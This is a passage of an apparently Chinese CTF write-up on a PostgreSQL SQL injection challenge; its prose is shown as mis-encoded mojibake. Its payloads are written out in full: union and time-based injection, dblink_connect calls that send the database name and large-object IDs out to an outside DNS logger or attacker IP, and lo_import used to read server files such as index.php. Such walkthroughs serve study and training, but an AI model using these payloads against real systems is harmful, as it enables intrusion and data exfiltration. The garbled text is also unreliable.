    <content type="html"><![CDATA[<p>åªåšäº†ä¸€é“é¢˜ï¼ŒæŒ‰Fæ³¨å…¥ï¼Œç ”ç©¶äº†pgsqlï¼Œç®—ä¸ªå°ç¬”è®°ï¼Œä¸èƒ½ç®—ç ”ç©¶æ€§æ–‡ç« </p><a id="more"></a><h2 id="æŒ‰Fæ³¨å…¥"><a href="#æŒ‰Fæ³¨å…¥" class="headerlink" title="æŒ‰Fæ³¨å…¥"></a>æŒ‰Fæ³¨å…¥</h2><p>æ‰“å¼€é¢˜ç›®çœ‹åˆ°åªèƒ½æ‰‹æœºè®¿é—®ï¼Œçœ‹åˆ°äº†æºç </p><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">&lt;</span>body<span class="token operator">></span>åªæœ‰æ‰‹æœºæ‰èƒ½è®¿é—®<span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">function</span> <span class="token function">is_mobile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token variable">$clientkeywords</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token single-quoted-string string">'nokia'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sony'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ericsson'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mot'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'samsung'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'htc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sgh'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lg'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sharp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'sie-'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'philips'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'panasonic'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'alcatel'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'lenovo'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'iphone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ipod'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'blackberry'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'meizu'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'android'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'netfront'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'symbian'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'ucweb'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'windowsce'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'palm'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamini'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'operamobi'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'openwave'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'nexusone'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'cldc'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'midp'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'wap'</span><span class="token punctuation">,</span><span class="token single-quoted-string string">'mobile'</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token comment">//ä»HTTP_USER_AGENTä¸­æŸ¥æ‰¾æ‰‹æœºæµè§ˆå™¨çš„å…³é”®å­—--></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/("</span> <span class="token punctuation">.</span> <span class="token function">implode</span><span class="token punctuation">(</span><span class="token single-quoted-string string">'|'</span><span class="token punctuation">,</span> <span class="token variable">$clientkeywords</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token double-quoted-string string">")/i"</span><span class="token punctuation">,</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token single-quoted-string string">'HTTP_USER_AGENT'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">true</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token keyword">return</span> <span class="token boolean constant">false</span><span class="token punctuation">;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span><span class="token punctuation">&#125;</span><span class="token operator">--</span><span class="token operator">></span><span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">></span></code></pre><p>äºæ˜¯åœ¨HEADERé‡Œæ·»åŠ <code>User-Agent: mobile</code>å³å¯</p><img src="/article/cqb2021/image-20210201185004667.png" class="" title="UA" loading="lazy"><p>ç‚¹å‡»ä»»ä½•éƒ½æ˜¯JavaScriptè„šæœ¬<code>javascript:alert(&#39;æŠ•ç¥¨æˆåŠŸ,æ­å–œæ‚¨è·å¾—å¥¶å¥¶ä¸€ä¸ª&#39;)</code>ï¼Œåº•éƒ¨å‘ç°äº†æç¤º</p><p><code>&lt;!--&lt;a href=&quot;?f=1&quot;&gt;æˆ‘é€‰æ‹©æŒ‰ä¸‹Fè¿›å…¥TK&lt;/a&gt;--&gt;</code></p><p>äºæ˜¯è®¿é—®<code>./?f=1</code>æ²¡æœ‰å˜åŒ–ï¼ŒçŒœæµ‹SSRFæˆ–SQLæ³¨å…¥ï¼Œä½†æ˜¯æ²¡æœ‰å…¶ä»–æç¤ºã€‚</p><p>è®¿é—®<code>./?f=1&#39;</code>å‘ç°æœ‰å¼¹çª—</p><img src="/article/cqb2021/image-20210201185510275.png" class="" title="å°å“¥å“¥" loading="lazy"><p>fuzzä¸€æ³¢ï¼Œå‘ç°<code>#</code>å’Œ<code>%23</code>éƒ½ä¼šä¸€ç›´å¼¹çª—ï¼Œè€Œä½¿ç”¨<code>--</code>æ³¨é‡Šå³<code>?f=1&#39; --</code>å´ä¸ä¼šå¼¹çª—ï¼Œæœç´¢ä¸€æ³¢å‘ç°æ˜¯ PostgreSQL ï¼ŒçŒœæµ‹<strong>è¯­æ³•é”™è¯¯</strong>æˆ–è€…<strong>æŠ¥é”™</strong>ä¼šæœ‰å¼¹çª—</p><p>ç”šè‡³æœåˆ°äº†åŸé¢˜ï¼Œèµ›åå‘ <a href="https://ha1c9on.top/">@HA1C9ON</a> å¤§ä½¬è¯·æ•™å¾—çŸ¥ï¼Œå½“æ—¶æ¯”èµ›çš„WPæ˜¯æœ‰é”™è¯¯çš„ï¼Œåç»­ä¼šé“æ¥ã€‚</p><p>æµ‹è¯•ä¸€ä¸‹å‘ç°<code>./?f=</code></p><blockquote><ul><li><code>gyy</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39;</code>ï¼Œè­¦å‘Š</li><li><code>gyy&#39; and 1=0 --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; and 1=1 --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; order by 1 --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; order by 2 --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; order by 3 --</code>ï¼Œ è­¦å‘Š</li><li><code>gyy&#39; union select 1,2 --</code>ï¼Œ è­¦å‘Š</li><li><code>gyy&#39; union select 1,&#39;2&#39; --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; union select 1,pg_sleep(10) --</code>ï¼Œ è­¦å‘Š</li><li><code>gyy&#39; union select 1,cast(pg_sleep(10) as text) --</code>ï¼Œæ²¡æœ‰è­¦å‘Šï¼ˆæœ‰å»¶è¿Ÿï¼ï¼‰</li><li><code>gyy&#39; union select 1,&#39;2&#39; from pg_database --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; union select 1,&#39;2&#39; from gyy --</code>ï¼Œ è­¦å‘Š</li><li><code>gyy&#39; union select 1,chr(65) --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li><li><code>gyy&#39; union select 1,chr(-65) --</code>ï¼Œæ²¡æœ‰è­¦å‘Š</li></ul></blockquote><p>ç”±order byå¯ä»¥åˆ¤æ–­æ­¤å¤„åˆ—æ•°ä¸º2ï¼Œç”±union selectå¯ä»¥åˆ¤æ–­1å¤„å¯¹åº”åˆ—ä¸ºæ•°å€¼ç±»å‹ï¼Œ2å¤„å¯¹åº”éæ•°å€¼ç±»å‹</p><h3 id="æ–¹æ³•ä¸€ï¼šå»¶æ—¶æ³¨å…¥"><a href="#æ–¹æ³•ä¸€ï¼šå»¶æ—¶æ³¨å…¥" class="headerlink" title="æ–¹æ³•ä¸€ï¼šå»¶æ—¶æ³¨å…¥"></a>æ–¹æ³•ä¸€ï¼šå»¶æ—¶æ³¨å…¥</h3><p> postgrestæ•°æ®åº“ä¸­çš„å»¶æ—¶å‡½æ•°æœ‰<code>pg_sleep()</code>/<code>pg_sleep_for()</code>/<code>pg_sleep_until()</code></p><p>æŸ¥é˜…èµ„æ–™å¾—çŸ¥ï¼š</p><blockquote><p>pg_sleep(seconds)<br>pg_sleep_for(interval)<br>pg_sleep_until(timestamp with time zone)</p><p>pg_sleepè®©å½“å‰çš„ä¼šè¯è¿›ç¨‹ä¼‘çœ seconds ç§’ä»¥åå†æ‰§è¡Œã€‚secondsæ˜¯ä¸€ä¸ªdouble precision ç±»å‹çš„å€¼ï¼Œæ‰€ä»¥å¯ä»¥æŒ‡å®šå¸¦å°æ•°çš„ç§’æ•°ã€‚<br>pg_sleep_for å¯¹äºæŒ‡å®šä¸ºintervalçš„è¾ƒé•¿ç¡çœ æ—¶é—´æ˜¯ä¸€ä¸ªä¾¿åˆ©å‡½æ•°ã€‚<br>pg_sleep_untilåœ¨éœ€è¦ç‰¹å®šå”¤é†’æ—¶é—´æ—¶æ¯”è¾ƒä¾¿åˆ©ã€‚</p><p>SELECT pg_sleep(1.5);<br>SELECT pg_sleep_for(â€˜5 minutesâ€™);<br>SELECT pg_sleep_until(â€˜tomorrow 03:00â€™);</p></blockquote><p>å½“æ—¶æ¯”èµ›è„šæœ¬å‚è€ƒ <a href="https://github.com/w181496/CTF/blob/master/fbctf2019/hr_admin_module/exp.py">balsn</a></p><p>è¿™é‡Œä¸åšé˜è¿°ï¼Œå› ä¸ºæœ€ç»ˆå¾—å‡ºç»“æœ</p><pre class="language-none"><code class="language-none">version: (Debian 11.2-1.pgdg90+1)current_db: docker_dbcurrent_schema: publictable of public: searchescolumns of searches: id,searchcounts of searches:0</code></pre><p><code>searches</code>è¡¨ä¸ºç©ºï¼Œæ‰€ä»¥æœ¬é¢˜åº”è¯»å–æ–‡ä»¶</p><h3 id="æ–¹å¼äºŒï¼šä¿¡æ¯å¸¦å¤–"><a href="#æ–¹å¼äºŒï¼šä¿¡æ¯å¸¦å¤–" class="headerlink" title="æ–¹å¼äºŒï¼šä¿¡æ¯å¸¦å¤–"></a>æ–¹å¼äºŒï¼šä¿¡æ¯å¸¦å¤–</h3><p>åˆ©ç”¨DNSlogæ–¹å¼</p><p>åœ¨PostgreSQLä¸­ï¼Œå­˜åœ¨dblinkæ¨¡å—ï¼Œå¯ä»¥å¤–è”æ•°æ®åº“æˆ–è€…å½“å‰æ•°æ®åº“ï¼Œdblink_connectåŒæ—¶ä¼šå¯¹hostè¿›è¡ŒDNSæŸ¥è¯¢ï¼Œåˆ©ç”¨æŸ¥è¯¢ç»™å®šDNSçš„å­åŸŸåï¼Œå†æŸ¥DNSè§£æè®°å½•å³å¯è·å–ä¼ é€’çš„ä¿¡æ¯ï¼Œè¿™é‡Œç”¨<a href="http://ceye.io/">ceye</a>æ¥è®°å½•</p><p>é¦–å…ˆçœ‹çœ‹dblinkæ¨¡å—æœ‰æ²¡æœ‰å¼€å¯</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;&#39;)) --</code></pre><p>æ²¡æœ‰æŠ¥é”™ï¼Œè¯´æ˜å¯ä»¥æ“ä½œç»§ç»­å°è¯•</p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;1&#39; union select 1,(select dblink_connect(&#39;host&#x3D;&#39; || (SELECT current_database()) || &#39;.xxxx.ceye.io user&#x3D;a password&#x3D;a dbname&#x3D;a&#39;)) --</code></pre><p>xxxxæ˜¯ceyeä¸ªäººçš„ Identifier ï¼Œå¯è§æˆåŠŸè¿”å›äº†å½“å‰æ•°æ®åº“å</p><img src="/article/cqb2021/image-20210201195343606.png" class="" title="ceye" loading="lazy"><p>åŸç†æ˜¯é€šè¿‡<code>.</code>è¿æ¥ï¼Œè®©pgsqlå»è§£æhostå³ç»™å®šDNSçš„å­åŸŸåï¼Œä»è€Œå¸¦å‡ºä¿¡æ¯ã€‚é¡ºç€è¿™ä¸ªæ–¹æ³•å¯ä»¥å¸¦å‡ºæ¥éƒ¨åˆ†ä¿¡æ¯</p><p>æ¥ç€å°±è¦è€ƒè™‘å¦‚ä½•æ–‡ä»¶åŒ…å«äº†ï¼Œåœ¨è¿™é‡ŒåŸWPå†™çš„å¾ˆæ¸…æ¥š</p><blockquote><p>æˆ‘ä»¬å¯èƒ½ç¡®å®éœ€è¦ä»ä¸­çªƒå–æ•°æ®<code>/var/lib/postgresql/data/secret</code>ã€‚ä¸å¹¸çš„æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬å°è¯•ä½¿ç”¨<code>pg_read_file</code>æˆ–<code>pg_read_binary_file</code>è¯»å–æ–‡ä»¶ï¼Œåˆ™ä¸ä¼šè·å¾—ä¼ å…¥è¿æ¥ï¼Œå› æ­¤å½“å‰ç”¨æˆ·å¯èƒ½æ— æƒä½¿ç”¨è¿™äº›åŠŸèƒ½ã€‚</p><p>è¯»å–æ–‡ä»¶çš„æ›¿ä»£æ–¹æ³•æ˜¯ä½¿ç”¨<a href="https://www.postgresql.org/docs/11/lo-funcs.html">å¤§å¯¹è±¡</a>ã€‚æˆ‘ä»¬å¯ä»¥ç”¨æ¥<code>lo_import</code>å°†æ–‡ä»¶çš„å†…å®¹åŠ è½½åˆ°<code>pg_largeobject</code>ç›®å½•ä¸­ã€‚å¦‚æœæŸ¥è¯¢æˆåŠŸï¼Œæˆ‘ä»¬å°†è·å¾—å¯¹è±¡çš„<code>oid</code>ã€‚</p></blockquote><p> å½“å‰ç”¨æˆ·ä¸ºdockerï¼Œä¸å¤Ÿæƒé™æ‰§è¡Œç³»ç»Ÿç®¡ç†å‘˜æ‰èƒ½æ‰§è¡Œçš„å‡½æ•°<code>pg_read_file()</code>, <code>pg_ls_dir()</code> or <code>pg_stat_file()</code> ï¼Œä¹Ÿä¸æ–¹ä¾¿å†™udfï¼Œæ²¡æœ‰å†™æƒé™ã€‚</p><p>ä¸‹é¢æˆªå–åŸWPçš„éƒ¨åˆ†å†…å®¹ï¼š</p><blockquote><p>ç¢°åˆ°è¿™ç§æƒ…å†µä¹Ÿå°±æ˜¯éœ€è¦ç»•è¿‡çš„æ—¶å€™çš„åšæ³•ï¼Œä¸€èˆ¬éƒ½æ˜¯è°·æ­Œç™¾åº¦ï¼Œç„¶åé˜…è¯»æ–‡æ¡£ï¼Œå¦å¤–å¯ä»¥è‡ªå·±èµ·ä¸€ä¸ªç¯å¢ƒå»æœç´¢ç›¸å…³çš„å‡½æ•°ã€‚ä¾‹å¦‚åœ¨è¿™é‡Œï¼Œbalsnçš„åšæ³•æ˜¯å¦å¤–èµ·ä¸€ä¸ªç¯å¢ƒï¼š</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%file%&#39;;   æŸ¥è¯¢æ‰€æœ‰å¸¦æœ‰fileçš„å‡½æ•°pg_stat_get_db_temp_files pg_walfile_name_offset pg_walfile_name pg_rotate_logfile_old pg_read_file_old pg_read_file pg_read_file pg_read_file pg_read_binary_file pg_read_binary_file pg_read_binary_file pg_stat_file pg_stat_file pg_relation_filenode pg_filenode_relation pg_relation_filepath pg_show_all_file_settings pg_hba_file_rules pg_rotate_logfile pg_current_logfile pg_current_logfile</code></pre><p>ä½†æ˜¯è¿™äº›å‡½æ•°éƒ½ä¼¼ä¹æ²¡èµ·ä½œç”¨</p><pre class="language-text" data-language="text"><code class="language-text">SELECT proname FROM pg_proc WHERE proname like &#39;%read%&#39;;   æŸ¥é˜…å¸¦æœ‰readçš„å‡½æ•°loread pg_stat_get_db_blk_read_time pg_read_file_old pg_read_file pg_read_binary_file</code></pre><p>å¯ä»¥çœ‹åˆ°ç¬¬ä¸€ä¸ªæ–¹æ³•ï¼Œé€šè¿‡æŸ¥é˜…æ–‡æ¡£ï¼ˆå­¦ä¼šé˜…è¯»æ–‡æ¡£å¾ˆé‡è¦ï¼ï¼‰</p><p>loreadæ˜¯é¢å‘SQLçš„å¤§å¯¹è±¡å‡½æ•°ï¼Œæ¯”å¦‚<code>lo_from_bytea</code>ï¼Œ<code>lo_put</code>ï¼Œ<code>lo_get</code>ï¼Œ<code>lo_creat</code>, <code>lo_create</code>,</p><pre class="language-none"><code class="language-none">lo_unlink&#96;ï¼Œ &#96;lo_import&#96;å’Œ &#96;lo_export</code></pre><p> æœåŠ¡å™¨ç«¯çš„<code>lo_import</code>å’Œ <code>lo_export</code>å‡½æ•°å’Œå®¢æˆ·ç«¯çš„é‚£å‡ ä¸ªæœ‰ç€æ˜¾è‘—çš„ä¸åŒã€‚ è¿™ä¸¤ä¸ªå‡½æ•°åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶ç³»ç»Ÿé‡Œè¯»å†™æ–‡ä»¶ï¼Œ ä½¿ç”¨æ•°æ®åº“æ‰€æœ‰è€…çš„æƒé™è¿›è¡Œã€‚ å› æ­¤ï¼Œåªæœ‰è¶…çº§ç”¨æˆ·æ‰èƒ½ä½¿ç”¨ä»–ä»¬ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼Œå®¢æˆ·ç«¯çš„è¾“å…¥å’Œè¾“å‡ºå‡½æ•°åœ¨å®¢æˆ·ç«¯çš„æ–‡ä»¶ç³»ç»Ÿé‡Œè¯»å†™æ–‡ä»¶ï¼Œ ä½¿ç”¨å®¢æˆ·ç«¯ç¨‹åºçš„æƒé™ã€‚å®¢æˆ·ç«¯å‡½æ•°ä¸éœ€è¦è¶…çº§ç”¨æˆ·æƒé™ã€‚<br><code>lo_read</code>å’Œ<code>lo_write</code>çš„åŠŸèƒ½é€šè¿‡æœåŠ¡å™¨ç«¯è°ƒç”¨å¯ç”¨ï¼Œ ä½†æ˜¯æœåŠ¡å™¨ç«¯å‡½æ•°åä¸åŒäºå®¢æˆ·ç«¯æ¥å£ï¼Œå› ä¸ºä»–ä»¬ä¸åŒ…å«ä¸‹åˆ’çº¿ã€‚ä½ å¿…é¡»ä½œä¸º<code>loread</code>å’Œ<code>lowrite</code> è°ƒç”¨è¿™äº›å‡½æ•°ã€‚ </p><p>åœ¨å°†æœåŠ¡å™¨ç«¯lo_importå’Œlo_exportå‡½æ•°æˆæƒç»™éè¶…çº§ç”¨æˆ·æ—¶éœ€è¦ä»”ç»†è€ƒè™‘å®‰å…¨éšæ‚£ã€‚ å…·æœ‰æ­¤ç±»æƒé™çš„æ¶æ„ç”¨æˆ·å¯ä»¥è½»æ¾åœ°å°†å…¶å˜ä¸ºè¶…çº§ç”¨æˆ·ï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡é‡å†™æœåŠ¡å™¨é…ç½®æ–‡ä»¶ï¼‰ï¼Œæˆ–è€…å¯ä»¥æ”»å‡»æœåŠ¡å™¨çš„å…¶ä½™æ–‡ä»¶ç³»ç»Ÿï¼Œè€Œæ— éœ€è·å–æ•°æ®åº“è¶…çº§ç”¨æˆ·æƒé™ã€‚ å› æ­¤ï¼Œå¯¹è¿™ä¸¤ä¸ªå‡½æ•°çš„æƒé™æˆäºˆå¿…é¡»è°¨æ…ã€‚</p></blockquote><p>å›åˆ°é¢˜ç›®ä¸­æ¥ï¼Œlo_importæ–¹æ³•å¯ä»¥è¯»å–æ–‡ä»¶ä¸ºpostgreså¯¹è±¡ï¼ŒåŸå‡†å¤‡åˆ©ç”¨lo_exportå†™æ–‡ä»¶ï¼Œå¯æ˜¯åº”è¯¥æ˜¯æ²¡æœ‰æƒé™</p><p>æˆ‘ä»¬å…ˆåŒ…å«<code>index.php</code>çœ‹çœ‹æºç </p><pre class="language-none"><code class="language-none">.&#x2F;?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p><strong>è¯·æ³¨æ„ï¼è¯·æ³¨æ„ï¼è¯·æ³¨æ„ï¼</strong>é”™è¯¯å†™æ³•ï¼š</p><p><code>./?f=gyy&#39; union select 1,(select dblink_connect(&#39;host=&#39; || (select lo_import(&#39;/var/www/html/index.php&#39;)) || &#39;.xxxx.ceye.io user=a password=a dbname=a&#39;)) --</code></p><p>è¡¨é¢ä¸Šç¡®å®è¿”å›äº†oid</p><img src="/article/cqb2021/image-20210201200309775.png" class="" title="DNSlogoid" loading="lazy"><p>ä½†æ˜¯ï¼Œåœ¨ dblinkä¸‹ lo_importåªæ˜¯åœ¨vpsä¸Šçš„ ç”Ÿæ•ˆï¼Œå¹¶æ²¡æœ‰å®é™…åŒ…å«ï¼Œåœ¨æ–¹å¼ä¸‰ä¼šæœ‰å®éªŒè¯æ˜ï¼Œåœ¨æœ€åæœ‰å¯¹æ³¨å…¥ç‚¹çš„è§£é‡Šã€‚</p><p>ç„¶åæ¥ä¸‹æ¥å‘ç°ï¼Œè¿™é‡Œåˆ©ç”¨DNSlogè¿›è¡Œä¿¡æ¯å¤–å¸¦è¿˜æœ‰çš„é—®é¢˜æ˜¯è¦éµå¾ªDNSåè®®ï¼Œæœ€å¤§ä½æ•°ä¸è¶…è¿‡63ä½ï¼Œä¸”ä¸èƒ½æœ‰ä»»ä½•ç‰¹æ®Šç¬¦å·åŠç©ºæ ¼å›è½¦ä¹‹ç±»çš„ï¼Œåªèƒ½ç”¨<code>substring</code>å‡½æ•°ä¸€æ®µä¸€æ®µæˆªå–ï¼Œè¿˜å¾—<code>replace</code>æ›¿æ¢å­—ç¬¦ï¼Œå¯ä»¥å®Œæˆä½†éå¸¸éº»çƒ¦ï¼Œä¸æ¨èä½¿ç”¨ã€‚</p><h3 id="æ–¹å¼ä¸‰ï¼šæ•°æ®åº“å¤–è”"><a href="#æ–¹å¼ä¸‰ï¼šæ•°æ®åº“å¤–è”" class="headerlink" title="æ–¹å¼ä¸‰ï¼šæ•°æ®åº“å¤–è”"></a>æ–¹å¼ä¸‰ï¼šæ•°æ®åº“å¤–è”</h3><p>ä¸ºäº†æ›´å¥½ç†è§£ï¼Œä¸‹é¢å…ˆè¿›è¡Œå®éªŒæµ‹è¯•ï¼Œdblinkä¸‹ lo_importåªæ˜¯åœ¨vpsä¸Šçš„ ç”Ÿæ•ˆï¼Œå¹¶æ²¡æœ‰å®é™…åŒ…å«ï¼Œè¯¦æƒ…å¯è§å¦‚ä¸‹</p><hr><h4 id="å®éªŒ"><a href="#å®éªŒ" class="headerlink" title="å®éªŒ"></a>å®éªŒ</h4><p>æœåŠ¡å™¨æˆ–æœ¬åœ°èµ·ä¸€ä¸ªpgsqlæœåŠ¡ï¼Œå¯ä»¥å®‰è£…ï¼Œä¹Ÿå¯ä»¥dockerèµ·ä¸€ä¸ªè®°å¾—å¼€ç«¯å£æ˜ å°„ï¼Œç„¶åå°†å…¶ä¸­çš„<code>postgresql.conf</code>ä¸­è®¾ç½®<code>listen_addresses = &#39;*&#39;</code>ä»¥ç›‘å¬ã€‚ç„¶åè¿è¡Œtcpdumpç›‘å¬ç«¯å£æµé‡</p><pre class="language-none"><code class="language-none">sudo tcpdump -nX -i eth0 port 5432</code></pre><p>é»˜è®¤ç«¯å£ä¸º5432</p><p>dblinkä¸‹åŒ…å«æ–‡ä»¶</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;postgres password&#x3D;postgres dbname&#x3D;@&#39;|| (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)) )) --</code></pre><img src="/article/cqb2021/image-20210201215153531.png" class="" title="oid" loading="lazy"><p>è¿”å›oid16438ï¼Œæˆ‘ä»¬è¯»å–ä¸€ä¸‹æ‰€æœ‰oidåˆ—è¡¨çœ‹ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><p>æ²¡æœ‰æŠ¥é”™ï¼ŒåŒæ—¶ï¼Œ<strong>æ²¡æœ‰ä»»ä½•æ•°æ®è¿”å›</strong></p><p>è€Œæˆ‘ä»¬ç›´æ¥åŒ…å«<code>index.php</code>è¯•ä¸€ä¸‹</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (select lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>æ²¡æœ‰æŠ¥é”™ï¼Œå†æŸ¥ä¸€ä¸‹oidåˆ—è¡¨</p><img src="/article/cqb2021/image-20210201220913327.png" class="" title="oid2" loading="lazy"><p>æœ‰æ•°æ®è¿”å›ï¼ŒåŒæ—¶å¯è§16439å’Œ16440ï¼Œè€Œ16438å¹¶æ²¡æœ‰åœ¨åˆ—è¡¨ä¸­ï¼Œè¯»å–16438æ•°æ®æ²¡æœ‰è¿”å›ï¼Œè¯»å–16439ä¸16440æ­£å¸¸è¿”å›</p><p>å¯è§dblinkä¸‹lo_importåœ¨æœ¬åœ°æ˜¯ä¸ç”Ÿæ•ˆçš„</p><hr><p>è¿™æ˜¯åŸWPé‡Œçš„é”™è¯¯ï¼ŒåŸå› åœ¨äºå…¶flagæ–‡ä»¶æœ¬èº«å°±å·²ç»åŒ…å«åœ¨å¤§å¯¹è±¡é‡Œï¼Œæ‰€ä»¥ç›´æ¥å°±å¯æŸ¥è¯¢ï¼Œè€ŒdblinkçŠ¶æ€ä¸‹å¹¶æ²¡æœ‰ç”Ÿæ•ˆï¼Œç®—æ˜¯è¿™æ¬¡æ¯”èµ›è¿™é“é¢˜ç›®çš„æœ€å¤§æ”¶è·å§ã€‚</p><p>å¦‚å®éªŒæ‰€ç¤ºï¼Œæµç¨‹å¦‚ä¸‹ï¼ŒIPè®°å¾—æ›¿æ¢æˆè‡ªå·±çš„</p><p>é¦–å…ˆèµ·æœåŠ¡å¦‚å®éªŒä¸­æ‰€ç¤º</p><p>å…ˆå°†<code>index.php</code>åŒ…å«è¿›æ¥ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰çº¿ç´¢</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select (SELECT lo_import(&#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php&#39;)),&#39;2&#39; --</code></pre><p>ç„¶åè¯»å–å…¨éƒ¨oidåˆ—è¡¨</p><pre class="language-none"><code class="language-none">?f&#x3D;gyy&#39; union select 1,(SELECT dblink_connect(&#39;host&#x3D;IP user&#x3D;@&#39; || (SELECT string_agg(cast(oid as text), &#39;,&#39;) FROM pg_largeobject_metadata) || &#39; password&#x3D;postgres dbname&#x3D;postgres&#39;)) --</code></pre><img src="/article/cqb2021/image-20210202011754628.png" class="" title="oid3" loading="lazy"><p>ï¼ˆå¤šæŒ‰å‡ ä¸‹å°±ä¼šæœ‰å¤šä¸ªoidï¼Œè§è°…â€¦ï¼‰</p><p>ç„¶åè¯»<code>index.php</code>çš„oidè¯»å–æ•°æ®ï¼Œè¿™é‡Œå¯ä»¥ç›´æ¥è¯»ï¼Œlo_getæ•°æ®è½¬ç ä¸ºUTF-8ï¼Œç„¶åæ›¿æ¢æ¢è¡Œç¬¦(chr(10))å†æ›¿æ¢ç©ºæ 